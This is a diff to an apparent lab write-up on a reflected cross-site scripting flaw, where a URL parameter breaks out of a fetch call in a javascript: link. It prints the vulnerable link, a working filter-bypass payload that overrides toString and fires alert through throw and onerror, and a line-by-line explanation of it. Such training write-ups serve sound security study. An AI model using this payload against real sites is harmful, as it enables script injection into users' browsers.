@@ -3,11 +3,14 @@ Vulnerability:
 	Allowing an attacker to escape into the code via a parameter in the URL and inject JS. 
 	
 Exploit:
+	Injection Point:
+		<a href="javascript:fetch('/analytics', {method:'post',body:'/post%3fpostId%3d3[PAYLOAD]'}).finally(_ => window.location = '/')">Back to Blog</a>
+
 	Exploit Script:
 		https://server.net/post?postId=1&'},toString=a=>{throw/**/onerror=alert,1337},window+'',{b:'
 	
 Explanation:
-	& - To be able to inject other characters without the page ignore the request.
+	& - To be able to inject other characters without the page ignoring the request.
 	'} - Escape and close the body string then the option object (second parameter) in the fetch function.
 	toString=a=>{throw/**/onerror=alert,1337}:
 		toString=a=>{..} - Assigns function a to toString, overriding it's defualt value.
